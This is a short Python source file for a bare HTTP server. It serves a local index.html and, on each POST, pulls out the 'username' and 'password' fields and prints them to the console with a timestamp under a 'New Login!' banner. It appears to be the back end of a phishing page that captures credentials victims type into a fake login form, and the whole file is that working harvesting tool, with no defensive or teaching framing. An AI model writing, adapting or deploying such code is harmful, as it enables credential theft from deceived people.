from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
from datetime import datetime
import os

class H(BaseHTTPRequestHandler):
    def log_message(self,f,*a): pass
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type","text/html")
        self.end_headers()
        self.wfile.write(open("index.html","rb").read())
    def do_POST(self):
        d=parse_qs(self.rfile.read(int(self.headers["Content-Length"])).decode())
        u=d.get("username",[""])[0]
        p=d.get("password",[""])[0]
        t=datetime.now().strftime("%H:%M:%S")
        print("="*35, flush=True)
        print(f"New Login! [{t}]", flush=True)
        print(f"Username : {u}", flush=True)
        print(f"Password : {p}", flush=True)
        print("="*35, flush=True)
        self.send_response(200)
        self.send_header("Content-type","text/plain")
        self.send_header("Access-Control-Allow-Origin","*")
        self.end_headers()
        self.wfile.write(b"ok")

port = int(os.environ.get("PORT", 8080))
print(f"Waiting for logins on port {port}...", flush=True)
HTTPServer(("0.0.0.0", port), H).serve_forever()
